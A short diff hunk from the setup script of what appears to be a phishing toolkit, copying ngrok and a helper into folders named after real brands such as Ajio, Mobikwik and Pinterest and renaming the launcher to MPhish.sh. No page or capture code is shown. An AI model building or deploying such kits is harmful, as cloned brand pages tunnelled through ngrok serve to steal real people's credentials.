@@ -59,7 +59,7 @@ cp -R ngrok secnhack sites/ajio/
 cp -R ngrok secnhack sites/cryptocurrency/
 cp -R ngrok secnhack sites/mobikwik/
 cp -R ngrok secnhack sites/pinterest/
-chmod 7777 AdvPhishing.sh
+chmod 7777 MPhish.sh
 clear
 echo ""
 echo -e $'\e[1;91m[\e[0m\e[1;33m *** \e[0m\e[1;96m]\e[0m\e[1;91m KEEP IN MIND YOU HAVE TO ENTER  \e[1;33m[ *** ]\e[0m'
